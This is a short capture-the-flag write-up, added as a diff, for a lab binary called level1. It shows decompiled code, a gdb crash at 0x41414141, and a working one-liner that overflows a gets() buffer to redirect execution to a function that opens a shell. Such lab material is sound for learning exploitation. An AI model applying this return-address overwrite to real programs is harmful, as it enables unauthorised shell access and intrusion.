@@ -1,0 +1,21 @@
+//----- (08048444) --------------------------------------------------------
+int run()
+{
+  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
+  return system("/bin/sh");
+}
+We can see the funtion gets() so we can do a buffer overflow
+
+(gdb) run
+Starting program: /home/user/level1/level1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+We have this when we try to go more than 64 caracteres and we see the program search to execute the instruction in 0x41414141 who doesn't exist that the segfault
+But what we can do it's execute the function run who is at 0x08048444!
+
+(echo $'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x44\x84\x04\x08' && cat) | ./level1
+for that we put A still we have the overflow after we put the adress \x44\x84\x04\x08 and we do cat for getting the shell open
+and now we have the shell for level02
